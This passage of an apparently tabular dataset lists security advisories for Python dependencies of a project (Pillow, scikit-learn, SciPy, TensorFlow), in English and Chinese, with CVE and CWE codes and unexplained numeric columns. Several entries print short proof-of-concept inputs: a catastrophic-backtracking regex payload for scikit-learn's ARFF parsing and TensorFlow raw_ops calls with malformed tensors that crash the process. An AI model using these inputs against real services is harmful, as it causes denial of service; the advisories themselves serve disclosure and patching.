- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
aimhubio_aim,Pillow,>=7.1.0,True,,CWE-125,2021-10-02,"## Overview

Affected versions of this package are vulnerable to Out-of-bounds Read. The previous bounds check in `FilDecode.c` incorrectly calculated the required read buffer size when copying a chunk, potentially reading six extra bytes off the end of the allocated buffer from the heap.
## Remediation
Upgrade `pillow` to version 8.3.2 or higher.
## References
- [GitHub Release](https://github.com/python-pillow/Pillow/releases/tag/8.3.2)
",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-23437,CWE-125,2021-09-03,"Pillow是一款基于Python的图像处理库。
python中pillow模块8.3.2之前版本存在缓冲区错误漏洞，该漏洞源于网络系统或产品的代码开发过程中存在设计或实现不当的问题，攻击者利用该漏洞可导致拒绝服务。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25287,CWE-125,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在缓冲区错误漏洞，该漏洞允许远程攻击者访问敏感的信息。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25288,CWE-125,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在缓冲区错误漏洞，该漏洞允许远程攻击者访问敏感的信息。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
aimhubio_aim,Pillow,>=7.1.0,True,CVE-2020-35655,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
在Pillow 8.1.0之前版本存在缓冲区错误漏洞，该漏洞源于当解码SGI RLE图像文件时，SGIRleDecode有一个4字节的缓冲区过读，因为偏移量和长度表被错误处理。",3,0
aimhubio_aim,scikit-learn,0.21.2,True,CVE-2024-5206,CWE-921 CWE-922,,scikit-learn 是一个基于 Python 的开源机器学习模块，支持数据挖掘和数据分析等功能。该漏洞源于 TfidfVectorizer 类在处理训练数据时，意外地将所有标记存储在 stop_words_ 属性中，而非仅存储进行 TF-IDF 计算所需的令牌子集。这种行为可能导致敏感信息泄露，例如密码或密钥，因为 stop_words_ 属性中可能包含本应被丢弃的标记。,3,1
aimhubio_aim,scikit-learn,0.21.2,True,,CWE-1333,2023-01-01,"## Overview
[scikit-learn](https://pypi.org/project/scikit-learn/) is a Python module for machine learning built on top of SciPy and is distributed under the 3-Clause BSD license.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in ARFF processing.

## PoC
```python
import re
p = re.compile(r'^\{\s*((\"".*\""|\'.*\'|\S*)\s*,\s*)*(\"".*\""|\'.*\'|\S*)\s*\}$')
re.findall(p, ""{""+""',""*100)
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `scikit-learn` to version 0.24.2 or higher.
## References
- [GitHub Commit](https://github.com/renatopp/liac-arff/commit/15885a6c016573ab2fb8aab0583dcd09990417b4)
- [GitHub Commit](https://github.com/scikit-learn/scikit-learn/commit/f058ba588a0990549f344f2d3f0d17c7925b1022)
",3,2
aimhubio_aim,scikit-learn,0.21.2,True,,CWE-400,2021-04-07,"## Overview
[scikit-learn](https://pypi.org/project/scikit-learn/) is a Python module for machine learning built on top of SciPy and is distributed under the 3-Clause BSD license.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `_RE_TYPE_NOMINAL` regular expression which is evaluated in `_decode_attribute`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `scikit-learn` to version 0.24.2 or higher.
## References
- [GitHub Additional Information](https://github.com/scikit-learn/scikit-learn/blob/8ea176ae0ca535cdbfad7413322bbc3e54979e4d/sklearn/externals/_arff.py#L772)
- [GitHub Issue](https://github.com/scikit-learn/scikit-learn/issues/19522)
- [GitHub PR](https://github.com/scikit-learn/scikit-learn/pull/19597)
",4,0
aimhubio_aim,scikit-learn,0.21.2,True,CVE-2020-13092,CWE-502,2020-05-15,"scikit-learn是一款基于Python的开源机器学习程序包，它支持垃圾邮件检测、图像识别和关联的连续值属性预测等功能。
scikit-learn (sklearn) 0.23.0及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
aimhubio_aim,scikit-learn,0.21.2,True,CVE-2020-28975,,2020-11-21,"Libsvm是Libsvm团队的一个用于SVM模式识别与回归的软件包。SVM用于模式识别或回归时，SVM方法及其参数、核函数及其参数的选择，也就是说最优SVM算法参数选择还只能是凭借经验、实验对比、大范围的搜寻或者利用软件包提供的交互检验功能进行寻优。
Libsvm v324 存在安全漏洞，该漏洞源于在svm.cpp中svm_predict_values，攻击者可利用该漏洞通过在n支持数组中使用一个经过精细加工的svm模型(通过pickle、json或任何其他模型永久标准引入)来导致拒绝服务(分割故障)。",2,1
aimhubio_aim,scipy,1.3.0,True,CVE-2023-29824,CWE-416,2023-07-06,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 1.8.0之前版本存在安全漏洞，该漏洞源于Py_FindObjects()函数存在内存释放后重用问题。",1,2
aimhubio_aim,scipy,1.3.0,True,CVE-2023-25399,CWE-401,2023-07-05,"SciPy是Scipy社区的所开发的一个开源的Python算法库和数学、科学、工程计算包，它包含了线性代数、积分、特殊函数等计算模块。
SciPy 存在安全漏洞，该漏洞源于在Py_FindObjects()函数中存在导致潜在内存泄漏的重新计数问题。",3,0
aimhubio_aim,tensorflow,2.5.3,True,,CWE-190,2022-05-26,"### Impact
The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is another instance of [TFSA-2021-198](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md) (CVE-2021-41197).
  
### Patches
We have patched the issue in GitHub commit [3796cc4fcd93ae55812a457abc96dcd55fbb854b](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.",3,-2
aimhubio_aim,tensorflow,2.5.3,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35935, where `SobolSample` is vulnerable to a denial of service via assumed scalar inputs, was found and fixed.
```python
import tensorflow as tf
tf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))
```

### Patches
We have patched the issue in GitHub commits [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf) and [02400ea266bd811fc016a848445de1bbff3a23a0](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)

The fix will be included in TensorFlow 2.11. We will also cherrypick both commits on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range. TensorFlow 2.7.4 will have the first commit cherrypicked.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by:
- Kang Hong Jin from Singapore Management University
- Neophytos Christou, Secure Systems Labs, Brown University
- 刘力源, Information System & Security and Countermeasures Experiments Center, Beijing Institute of Technology
- Pattarakrit Rattankul
",4,-2
aimhubio_aim,tensorflow,2.5.3,True,,,2022-11-22,"### Impact
Another instance of CVE-2022-35991, where `TensorListScatter` and `TensorListScatterV2` crash via non scalar inputs in`element_shape`, was found in eager mode and fixed.
```python
import tensorflow as tf
arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
arg_3=''
tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
element_shape=arg_2, name=arg_3)
```

### Patches
We have patched the issue in GitHub commit [bf9932fc907aff0e9e8cccf769e8b00d30fd81a1](https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Pattarakrit Rattankul
",4,-2
aimhubio_aim,tensorflow,2.5.3,True,,CWE-400,2022-05-26,"## Overview
[tensorflow](https://pypi.org/project/tensorflow/) is a machine learning framework.

Affected versions of this package are vulnerable to Denial of Service (DoS). The implementation of depthwise ops in TensorFlow is vulnerable to a denial of service via `CHECK`-failure (assertion failure) caused by overflowing the number of elements in a tensor:

```python
import tensorflow as tf

input = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
filter_sizes = tf.constant(1879048192, shape=[13], dtype=tf.int32)
out_backprop = tf.constant(1, shape=[1, 4, 4, 3], dtype=tf.float32)
tf.raw_ops.DepthwiseConv2dNativeBackpropFilter(
    input=input, filter_sizes=filter_sizes, out_backprop=out_backprop, strides=[1, 1, 1, 1], padding=""SAME"")
```
  
This is due to an incomplete fix for [CVE-2021-41197](https://security.snyk.io/vuln/?search=CVE-2021-41197).

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `tensorflow` to version 2.8.1, 2.7.2, 2.6.4 or higher.
## References
- [GitHub Commit](https://github.com/tensorflow/tensorflow/commit/3796cc4fcd93ae55812a457abc96dcd55fbb854b)
- [Tensorflow Advisory](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-198.md)
",2,2
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-35965,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于如果为 LowerBound 或 UpperBound 提供了一个空的 sorted_inputs 输入，它会导致 nullptr 取消引用，从而导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-36000,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 mlir::tfg::ConvertGenericFunctionToFunctionDef 被赋予空函数属性时，它给出一个空解引用。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,2.5.3,True,CVE-2022-29208,CWE-787,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
